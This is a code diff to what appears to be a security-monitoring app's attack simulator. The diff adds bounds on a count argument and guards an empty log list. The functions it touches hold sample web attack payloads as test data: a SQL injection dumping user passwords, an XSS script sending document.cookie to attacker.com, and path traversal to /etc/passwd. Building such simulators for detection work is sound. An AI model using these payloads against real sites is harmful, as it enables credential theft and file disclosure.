@@ -14,6 +14,7 @@ from .fusion_engine import evaluate_and_fuse_profile
 
 def simulate_sqli(ip="198.51.100.45", count=3):
     """Simulate SQL Injection attack traffic."""
+    count = max(1, min(int(count or 1), 50))
     payloads = [
         ("GET", "/api/search/?q=' UNION SELECT id, username, password FROM auth_user --", 200, None),
         ("POST", "/products/?category=1' OR '1'='1", 500, None),
@@ -45,12 +46,13 @@ def simulate_sqli(ip="198.51.100.45", count=3):
         profile.sqli_count += 1
         logs_created.append(log)
 
-    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
+    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
     return {'status': 'SUCCESS', 'type': 'SQL Injection', 'ip': ip, 'count': count}
 
 
 def simulate_brute_force(ip="203.0.113.88", count=6):
     """Simulate Login Brute-Force flood."""
+    count = max(1, min(int(count or 1), 50))
     usernames = ['admin', 'root', 'administrator', 'system', 'sec_admin', 'operator']
     profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
     logs_created = []
@@ -75,12 +77,13 @@ def simulate_brute_force(ip="203.0.113.88", count=6):
         profile.brute_force_count += 1
         logs_created.append(log)
 
-    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
+    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
     return {'status': 'SUCCESS', 'type': 'Brute Force', 'ip': ip, 'count': count}
 
 
 def simulate_recon(ip="192.0.2.140", count=8):
     """Simulate Reconnaissance & Directory Fuzzing scan."""
+    count = max(1, min(int(count or 1), 50))
     fuzz_paths = [
         "/admin.php", "/wp-login.php", "/.env", "/backup.sql", "/config.json",
         "/api/v1/debug/", "/phpmyadmin/", "/.git/config", "/server-status"
@@ -106,12 +109,13 @@ def simulate_recon(ip="192.0.2.140", count=8):
             profile.recon_count += 1
         logs_created.append(log)
 
-    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
+    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
     return {'status': 'SUCCESS', 'type': 'Reconnaissance Scan', 'ip': ip, 'count': count}
 
 
 def simulate_xss(ip="198.51.100.99", count=3):
     """Simulate Cross-Site Scripting (XSS) injection attacks."""
+    count = max(1, min(int(count or 1), 50))
     payloads = [
         ("/comment/?msg=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>", 200),
         ("/search/?q=<img src=x onerror=alert('XSS_PAYLOAD_EXEC')>", 200),
@@ -137,12 +141,13 @@ def simulate_xss(ip="198.51.100.99", count=3):
         profile.xss_count += 1
         logs_created.append(log)
 
-    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
+    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
     return {'status': 'SUCCESS', 'type': 'Cross-Site Scripting (XSS)', 'ip': ip, 'count': count}
 
 
 def simulate_path_traversal(ip="203.0.113.12", count=3):
     """Simulate Path Traversal / LFI attacks."""
+    count = max(1, min(int(count or 1), 50))
     payloads = [
         "/download/?file=../../../../etc/passwd",
         "/view_log/?file=%2e%2e%2f%2e%2e%2fwindows/win.ini",
@@ -168,12 +173,13 @@ def simulate_path_traversal(ip="203.0.113.12", count=3):
         profile.path_traversal_count += 1
         logs_created.append(log)
 
-    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
+    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1] if logs_created else None)
     return {'status': 'SUCCESS', 'type': 'Path Traversal / LFI', 'ip': ip, 'count': count}
 
 
 def simulate_normal_traffic(ip="192.168.1.50", count=5):
     """Simulate legitimate clean user browsing."""
+    count = max(1, min(int(count or 1), 50))
     clean_paths = ["/", "/threats/", "/evaluation/", "/hunting/", "/simulator/"]
     logs_created = []
 
